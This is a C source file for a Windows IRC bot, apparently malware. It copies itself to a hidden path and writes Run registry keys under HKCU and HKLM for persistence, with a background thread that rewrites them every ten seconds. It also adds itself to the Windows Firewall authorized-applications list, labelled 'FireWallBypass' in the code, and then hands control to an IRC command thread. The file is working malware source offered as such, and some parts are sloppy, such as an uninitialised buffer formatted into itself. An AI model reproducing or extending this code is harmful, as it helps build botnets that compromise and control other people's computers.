#include "includes.h"
#include "config.h"

char CurrentName[1024];
HANDLE xetum;

bool checkKey(HKEY tree, const char *folder, char *key)
{
	long lRet;
	HKEY hKey;
	char temp[150];
	DWORD dwBufLen;
	lRet = RegOpenKeyEx( tree, folder, 0, KEY_QUERY_VALUE, &hKey );
	if (lRet != ERROR_SUCCESS)
		return 0;
	dwBufLen = sizeof(temp);
	lRet = RegQueryValueEx( hKey, key, NULL, NULL, (BYTE*)&temp, &dwBufLen );
	if (lRet != ERROR_SUCCESS)
		return 0;
	
	lRet = RegCloseKey( hKey );
	if (lRet != ERROR_SUCCESS)
		return 0;
	return 1;
}

DWORD WINAPI Persistence(LPVOID param)
{
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);

	HKEY		Install;
	char		pfad[256];
	
	while(1){
		Sleep(10000);
		while (checkKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", szRegname)  == 0)
		{
			RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL);
			RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
			RegCloseKey(Install);
		}
		while (checkKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", szRegname)  == 0)
		{
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL);
			RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
			RegCloseKey(Install);
		}
		while (checkKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", szRegname)  == 0)
		{
			_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", pfad, exename);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, 0);
			RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
		}
	}

	return 1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	DWORD id;

	SetErrorMode(SEM_NOGPFAULTERRORBOX);

	Sleep(2000);

    //mutex-check
	xetum = CreateMutex(NULL, FALSE, cfg_mutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);
	char test[1] = "";


	//check if executed from USB drive
	char currentdir[1024];

	GetCurrentDirectory(1024,currentdir);



#ifndef DEBUGGING

	//install
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);

	if (MoveBot(movetopath,exename))
	{
		HKEY		Install;
		char		pfad[256];

		///////////////////////////////////////////////////////////////////////////////
		
		//Guest Startup (JIC)
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL);
		RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
		RegCloseKey(Install);

		//Admin Startup
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL);
		RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
		RegCloseKey(Install);

		//FireWallBypass
		_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", pfad, exename);
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, 0);
		RegSetValueEx(Install, szRegname, 0, REG_SZ, (const unsigned char *)spath, strlen(spath));
		RegCloseKey(Install);


		HKEY hndKey;

		hndKey= NULL;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
		RegSetValueEx(hndKey,szRegname,0, REG_SZ,(const unsigned char *)spath,strlen(spath));
		RegCloseKey(hndKey);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;

		sinfo.wShowWindow = SW_HIDE;

	}

#endif



	IRC_Thread((void*)test);

	return(0);

}
